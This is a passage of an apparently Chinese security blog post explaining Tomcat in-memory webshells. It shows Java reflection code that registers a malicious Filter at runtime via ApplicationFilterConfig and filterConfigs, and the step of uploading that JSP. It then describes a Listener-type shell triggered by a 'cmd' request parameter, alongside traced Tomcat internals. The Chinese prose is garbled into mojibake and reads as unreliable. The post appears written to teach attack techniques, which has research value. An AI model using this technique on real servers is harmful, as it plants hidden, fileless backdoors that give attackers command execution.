</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Constructor</span><span class="o">&lt;</span><span class="n">ApplicationFilterConfig</span><span class="o">&gt;</span> <span class="n">declaredConstructor</span> <span class="o">=</span> <span class="n">ApplicationFilterConfig</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">FilterDef</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">declaredConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span> <span class="n">declaredConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">standardContext</span><span class="o">,</span> <span class="n">filterDef</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">filterConfigs</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">filterName</span><span class="o">,</span> <span class="n">filterConfig</span><span class="o">);</span>
</span></span></code></pre></div></li>
<li>
<p>å°†æ„é€ çš„Filterå†…å­˜é©¬çš„jspæ–‡ä»¶ä¸Šä¼ åˆ°Tomcatï¼Œæ‰§è¡Œï¼ŒFilteræ³¨å†ŒæˆåŠŸï¼› <!-- raw HTML omitted --></p>
</li>
<li>
<p>è®¿é—®FilterMapä¸­æ‰€å®šä¹‰çš„è·¯å¾„ä¸‹çš„èµ„æºï¼ŒTomcatå°±ä¼šå°†Filterå†…å­˜é©¬æ·»åŠ åˆ°æ–°æ„å»ºçš„FilterChainä¸­ï¼ŒdoFilter()ä¸­çš„æ¶æ„ä»£ç å¾—ä»¥æ‰§è¡Œã€‚ <!-- raw HTML omitted --></p>
</li>
</ol>
<p><figure><img src="/ox-hugo/2022-10-25_21-44-50_screenshot.png"
         alt="Figure 2: Filterå†…å­˜é©¬æ³¨å†Œ&#43;æ‰§è¡ŒæˆåŠŸ" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 2: <!-- raw HTML omitted -->Filterå†…å­˜é©¬æ³¨å†Œ+æ‰§è¡ŒæˆåŠŸ</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<h3 id="å°ç»“">å°ç»“</h3>
<p>æˆ‘ä»¬é€šè¿‡ä»‹ç»ä¸€ä¸ªæ­£å¸¸çš„Filterç±»ä»å¼€å‘åˆ°ä½¿ç”¨ï¼Œäº†è§£äº†Filteræ˜¯å¦‚ä½•è¢«Tomcatæ‰€ä½¿ç”¨çš„ï¼Œä»¥åŠå…¶ä¸­æ‰€åŒ…å«çš„ä¸€äº›é‡è¦çš„æˆå‘˜å˜é‡ï¼› <!-- raw HTML omitted --></p>
<p>æ¥ç€æˆ‘ä»¬é€šè¿‡æ‰‹åŠ¨å¢åŠ è¿™äº›æˆå‘˜å˜é‡ï¼Œåœ¨Tomcatè¿è¡Œä¸­ï¼ŒåŠ¨æ€åœ°åŠ è½½å’Œæ³¨å†Œäº†ä¸€ä¸ªFilterï¼Œå¹¶æˆåŠŸä½¿å…¶è¢«è°ƒç”¨æ‰§è¡Œï¼› <!-- raw HTML omitted --></p>
<p>å°†ä¸Šä¸€å°èŠ‚ä»¥ä¸Šæ‰€æœ‰çš„ä»£ç ç‰‡æ®µæ”¾åœ¨åŒä¸€ä¸ªJSPæ–‡ä»¶ä¸­å°±å¯ä»¥å®Œæˆæ•´ä¸€ä¸ªFilterå†…å­˜é©¬ï¼Œè¿™é‡Œç¯‡å¹…çš„å…³ç³»ï¼Œå°±ä¸å†æ”¾å®Œæ•´çš„ä»£ç äº†ï¼› <!-- raw HTML omitted --></p>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸åŒå¸ˆå‚…ä»¬éƒ½æœ‰ä¸åŒçš„æ„é€ Filterå†…å­˜é©¬çš„æ–¹å¼ï¼Œåˆ©ç”¨çš„å‡½æ•°å’Œè¿‡ç¨‹éƒ½å¾ˆä¸ä¸€æ ·ï¼Œä½†æœ¬è´¨åº”è¯¥éƒ½æ²¡æœ‰å˜åŒ–ï¼š <!-- raw HTML omitted --></p>
<ul>
<li>å°±æ˜¯åœ¨å·²çŸ¥Tomcatä¼šåœ¨å¤„ç†æ¯ä¸€ä¸ªè¯·æ±‚æ—¶é‡æ–°æ„é€ ä¸€ä¸ª <strong>FilterChain</strong> è´£ä»»é“¾ï¼Œå¹¶ä¸”é€šè¿‡ <strong>FilterMaps</strong> å¯¹æ‰€æœ‰æ³¨å†Œçš„ <strong>Filter</strong> è¿›è¡Œç­›é€‰ååŠ å…¥æ–°æ„å»ºçš„ <strong>FilterChain</strong>, ä¹‹åè°ƒç”¨ <strong>doFilter()</strong> æ¥å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼› <!-- raw HTML omitted --></li>
<li>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯ï¼Œæƒ³åŠæ³•æ„é€ ä¸€ä¸ª <strong>Filter</strong> ï¼Œä½¿Tomcatåœ¨æ„é€ çš„  <strong>FilterChain</strong> çš„æ—¶å€™ï¼Œå…¶æœ‰èµ„æ ¼è¢«é€‰ä¸­åŠ å…¥ï¼Œå¹¶ä¸”æ‹¥æœ‰è¶³å¤Ÿçš„é…ç½®ä¿¡æ¯èƒ½å¤Ÿæ³¨å†Œä»¥åŠæ‰§è¡Œå³å¯ï¼› <!-- raw HTML omitted --></li>
</ul>
<h2 id="listenerå‹">Listenerå‹</h2>
<p>Listenerä¹Ÿæ˜¯ä¸‰å¤§ç»„ä»¶ä¹‹ä¸€ï¼Œä½œä¸ºç›‘å¬å™¨ï¼Œå…¶ä½œç”¨å°±æ˜¯ç›‘å¬Servletä¸­çš„å„ç§äº‹ä»¶çš„å‘ç”Ÿï¼Œä»è€Œåšå‡ºå¯¹åº”çš„æ“ä½œï¼Œæ ¹æ®Listeneræ‰€ç›‘å¬çš„äº‹ä»¶ï¼Œå¯ä»¥åˆ†ä¸º3ç±»ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>ç›‘å¬å¯¹è±¡ <code>åˆ›å»ºå’Œé”€æ¯</code> çš„ç›‘å¬å™¨ï¼› <!-- raw HTML omitted --></li>
<li>ç›‘å¬å¯¹è±¡ä¸­ <code>å±æ€§å˜æ›´</code> çš„ç›‘å¬å™¨ï¼› <!-- raw HTML omitted --></li>
<li>ç›‘å¬ <code>HttpSession</code> ä¸­çš„å¯¹è±¡çŠ¶æ€æ”¹å˜çš„ç›‘å¬å™¨ï¼› <!-- raw HTML omitted --></li>
</ol>
<p>å…¶ä¸­ï¼ŒServletRequestListeneræ˜¯æ¯”è¾ƒç”¨æ¥ä½œä¸ºå†…å­˜é©¬çš„ï¼Œå› ä¸ºå…¶ç›‘å¬çš„æ˜¯ <strong>ServletRequest</strong> å¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯ï¼Œæ¯å½“æˆ‘ä»¬è®¿é—®èµ„æºçš„æ—¶å€™ï¼Œéƒ½ä¼šç”±Connectorå°è£…åˆ›å»ºä¸€ä¸ª <strong>ServletRequest</strong> å¯¹è±¡ï¼Œè‡ªç„¶ä¹Ÿå°±å®¹æ˜“è§¦å‘ã€‚ <!-- raw HTML omitted --></p>
<p>åœ¨æˆ‘ä»¬æ„å»ºListenerå†…å­˜é©¬ä¹‹å‰ï¼Œå…ˆæ¥çœ‹çœ‹ä¸€ä¸ªæ­£å¸¸çš„Listeneræ˜¯å¦‚ä½•è¢«å¼€å‘ä»¥åŠåˆ©ç”¨çš„å§ã€‚ <!-- raw HTML omitted --></p>
<h3 id="å¼€å‘è‡ªå®šä¹‰listener">å¼€å‘è‡ªå®šä¹‰Listener</h3>
<h4 id="å¼€å‘listenerç±»">å¼€å‘Listenerç±»</h4>
<p>æˆ‘ä»¬å…ˆå®Œæˆè‡ªå®šä¹‰Listenerçš„å¼€å‘ï¼Œå…¶éœ€è¦å®ç°SevletRequestListeneræ¥å£ï¼Œå¹¶ä¸”å®ç° <code>requestInitialized()</code> æ–¹æ³•ï¼š <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-10-26_09-48-05_screenshot.png"
         alt="Figure 3: è‡ªå®šä¹‰ServletRequestListenerç±»" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 3: <!-- raw HTML omitted -->è‡ªå®šä¹‰ServletRequestListenerç±»</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<p>æ¥ç€åœ¨ <code>web.xml</code> ä¸­æ³¨å†Œè¿™ä¸ªListenerï¼š <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;listener&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;listener-class&gt;</span>com.example.tomcatmemshell.MyListener<span class="nt">&lt;/listener-class&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/listener&gt;</span>
</span></span></code></pre></div><p>ä¹‹åï¼Œå¯åŠ¨Tomcatï¼Œè®¿é—®ä»»æ„èµ„æºå¸¦ä¸Šcmdå‚æ•°ï¼Œå³å¯å®ç°æ•ˆæœï¼š <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-10-26_09-51-05_screenshot.png"
         alt="Figure 4: Listenerç›‘å¬å¹¶è°ƒç”¨requestInitialized()" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 4: <!-- raw HTML omitted -->Listenerç›‘å¬å¹¶è°ƒç”¨requestInitialized()</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<h4 id="tomcatå¯åŠ¨æ—¶æ³¨å†ŒåŠ è½½listenerç±»">Tomcatå¯åŠ¨æ—¶æ³¨å†ŒåŠ è½½Listenerç±»</h4>
<p>ä¸Filterä¸­ä¸€æ ·ï¼ŒTomcatåœ¨å¯åŠ¨æ—¶ä¼šå…ˆä» <strong>web.xml</strong> ä¸­è¯»å–é…ç½®ä¿¡æ¯ï¼Œä»è€ŒåŠ è½½è‡ªå®šä¹‰çš„ <strong>Listener</strong> ä¿¡æ¯ï¼š <!-- raw HTML omitted --></p>
<p>ConfigureConfigure#configureContext()ä¸­Listenerçš„éƒ¨åˆ†ç›¸å¯¹ç®€å•ï¼Œå°±æ˜¯è¯»å– <strong>web.xml</strong> ä¸­çš„ <strong>&lt;listener&gt;</strong> çš„å†…å®¹ï¼Œå¹¶è°ƒç”¨StandardContext#addApplicationListeneræ¥ä¿å­˜ï¼š <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">configureContext</span><span class="o">(</span><span class="n">WebXml</span> <span class="n">webxml</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">           <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">listener</span> <span class="o">:</span> <span class="n">webxml</span><span class="o">.</span><span class="na">getListeners</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">context</span><span class="o">.</span><span class="na">addApplicationListener</span><span class="o">(</span><span class="n">listener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p><strong>addApplicationListener()</strong> å°†Listenerçš„åå­—ä¿å­˜åœ¨ <code>applicationListeners[]</code> å­—ç¬¦ä¸²æ•°ç»„ä¸­ï¼š <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="n">String</span> <span class="n">applicationListeners</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[</span><span class="n">0</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@Override</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">addApplicationListener</span><span class="o">(</span><span class="n">String</span> <span class="n">listener</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">synchronized</span> <span class="o">(</span><span class="n">applicationListenersLock</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">results</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[</span><span class="n">applicationListeners</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="n">1</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">applicationListeners</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">listener</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">applicationListeners</span><span class="o">[</span><span class="n">i</span><span class="o">]))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">log</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="n">sm</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">&#34;standardContext.duplicateListener&#34;</span><span class="o">,</span><span class="n">listener</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">results</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">applicationListeners</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">results</span><span class="o">[</span><span class="n">applicationListeners</span><span class="o">.</span><span class="na">length</span><span class="o">]</span> <span class="o">=</span> <span class="n">listener</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">applicationListeners</span> <span class="o">=</span> <span class="n">results</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">fireContainerEvent</span><span class="o">(</span><span class="s">&#34;addApplicationListener&#34;</span><span class="o">,</span> <span class="n">listener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>æ¥ç€åœ¨StandardContextè°ƒç”¨startInternal()å¯åŠ¨æ—¶ï¼Œè°ƒç”¨listenerStart()æ¥åˆå§‹åŒ–å’ŒåŠ è½½æ‰€æœ‰çš„Listenerï¼š <!-- raw HTML omitted --></p>
<ol>
<li>æ ¹æ®applicationListenersä¸­ä¿å­˜çš„ç±»åï¼Œåˆ©ç”¨newInstance()æ¥åå°„æ„é€ Listenerå®ä¾‹ï¼› <!-- raw HTML omitted --></li>
<li>å°†Listenerå®ä¾‹æŒ‰ç…§ç±»åˆ«ï¼ˆå®ç°äº†ä¸åŒçš„Listeneræ¥å£ï¼‰åŠ å…¥eventListenersä»¥åŠlifecycleListeners; <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">listenerStart</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Instantiate the required listeners
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">String</span> <span class="n">listeners</span><span class="o">[]</span> <span class="o">=</span> <span class="n">findApplicationListeners</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">results</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">listeners</span><span class="o">.</span><span class="na">length</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">ok</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">results</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">getLogger</span><span class="o">().</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">getLogger</span><span class="o">().</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34; Configuring event listener class &#39;&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                    <span class="n">listeners</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">+</span> <span class="s">&#34;&#39;&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 1. æ ¹æ®applicationListenersä¸­ä¿å­˜çš„ç±»åï¼Œåˆ©ç”¨newInstance()æ¥åå°„æ„é€ Listenerå®ä¾‹ï¼›
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">String</span> <span class="n">listener</span> <span class="o">=</span> <span class="n">listeners</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">                <span class="n">results</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">getInstanceManager</span><span class="o">().</span><span class="na">newInstance</span><span class="o">(</span><span class="n">listener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 2. å°†Listenerå®ä¾‹æŒ‰ç…§ç±»åˆ«ï¼ˆå®ç°äº†ä¸åŒçš„Listeneræ¥å£ï¼‰åŠ å…¥eventListenersä»¥åŠ  lifecycleListeners
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">eventListeners</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
</span></span><span class="line"><span class="cl">        <span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lifecycleListeners</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="n">Object</span> <span class="n">result</span> <span class="o">:</span> <span class="n">results</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">((</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">ServletContextAttributeListener</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">||</span> <span class="o">(</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">ServletRequestAttributeListener</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">||</span> <span class="o">(</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">ServletRequestListener</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">||</span> <span class="o">(</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">HttpSessionIdListener</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">||</span> <span class="o">(</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">HttpSessionAttributeListener</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">eventListeners</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">((</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">ServletContextListener</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">||</span> <span class="o">(</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">HttpSessionListener</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">lifecycleListeners</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">eventListeners</span><span class="o">.</span><span class="na">addAll</span><span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="n">getApplicationEventListeners</span><span class="o">()));</span>
</span></span><span class="line"><span class="cl">        <span class="n">setApplicationEventListeners</span><span class="o">(</span><span class="n">eventListeners</span><span class="o">.</span><span class="na">toArray</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="n">Object</span> <span class="n">lifecycleListener</span><span class="o">:</span> <span class="n">getApplicationLifecycleListeners</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">lifecycleListeners</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">lifecycleListener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">lifecycleListener</span> <span class="k">instanceof</span> <span class="n">ServletContextListener</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">noPluggabilityListeners</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">lifecycleListener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">setApplicationLifecycleListeners</span><span class="o">(</span><span class="n">lifecycleListeners</span><span class="o">.</span><span class="na">toArray</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ok</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></div><p>è‡³æ­¤Listenerå·²ç»åœ¨Tomcatæ³¨å†Œå®Œæ¯•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å…·ä½“çš„è°ƒç”¨ã€‚ <!-- raw HTML omitted --></p>
<h4 id="tomcatè°ƒç”¨">Tomcatè°ƒç”¨</h4>
<p>æˆ‘ä»¬æ‰“ä¸Šæ–­ç‚¹æ¥çœ‹ä¸€ä¸‹è°ƒç”¨æ ˆï¼š <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-10-26_10-22-56_screenshot.png"
         alt="Figure 5: requestInitialized()çš„è°ƒç”¨æ ˆ" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 5: <!-- raw HTML omitted -->requestInitialized()çš„è°ƒç”¨æ ˆ</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<p>è‡ªä¸‹è€Œä¸Šçš„æ–¹æ³•è°ƒç”¨ç›¸ä¿¡å¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰äº†ï¼Œå°±æ˜¯é€šè¿‡Tomcatçš„ <strong>Pipeline-Valve</strong> è´£ä»»é“¾ï¼Œä¸æ–­è°ƒç”¨invokeæ¥å°†è¯·æ±‚åœ¨å­å®¹å™¨ä¸­ä¼ é€’ï¼› <!-- raw HTML omitted --></p>
<p>æˆ‘ä»¬é‡ç‚¹å…³æ³¨æœ€åä¸‰ä¸ªæ–¹æ³•ï¼š <!-- raw HTML omitted --></p>
<p>StandardHostValve#invoke()æ–¹æ³•ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>StandardHostå…ˆæ‰¾åˆ°å¯¹åº”çš„StandardContextï¼Œå°†è¯·æ±‚ä¼ é€’ä¸‹å»ï¼› <!-- raw HTML omitted --></li>
<li>æ¥ç€è°ƒç”¨StandardContextçš„fireRequestDestroyEvent()ï¼Œé€šçŸ¥StandardContextæœ‰ä¸€ä¸ªæ–°å»ºrequestäº‹ä»¶å‘ç”Ÿäº†ï¼› <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Request</span> <span class="n">request</span><span class="o">,</span> <span class="n">Response</span> <span class="n">response</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">isAsyncSupported</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">request</span><span class="o">.</span><span class="na">setAsyncSupported</span><span class="o">(</span><span class="n">context</span><span class="o">.</span><span class="na">getPipeline</span><span class="o">().</span><span class="na">isAsyncSupported</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">asyncAtStart</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">isAsync</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(!</span><span class="n">response</span><span class="o">.</span><span class="na">isErrorReportRequired</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">context</span><span class="o">.</span><span class="na">getPipeline</span><span class="o">().</span><span class="na">getFirst</span><span class="o">().</span><span class="na">invoke</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(!</span><span class="n">request</span><span class="o">.</span><span class="na">isAsync</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">asyncAtStart</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">context</span><span class="o">.</span><span class="na">fireRequestDestroyEvent</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getRequest</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></div><p>StandardContext#fireRequestInitEvent()ï¼š <!-- raw HTML omitted --></p>
<ol>
<li>è·å–æˆ‘ä»¬ä¹‹å‰åœ¨Tomcatå¯åŠ¨æ—¶ä¿å­˜åœ¨StandardContextå®ä¾‹ä¸­çš„æ‰€æœ‰ <strong>applicationEventListeners</strong>; <!-- raw HTML omitted --></li>
<li>æ¥ç€éå†æ‰€æœ‰çš„Listenersï¼Œæ‰¾åˆ°æ‰€æœ‰çš„ <code>ServletRequestListener</code>,è§¦å‘ç›‘å¬å™¨çš„æ–¹æ³•ï¼š <code>requestInitialized()</code>; <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">fireRequestInitEvent</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Object</span><span class="o">[]</span> <span class="n">instances</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getApplicationEventListeners</span><span class="o">();</span>
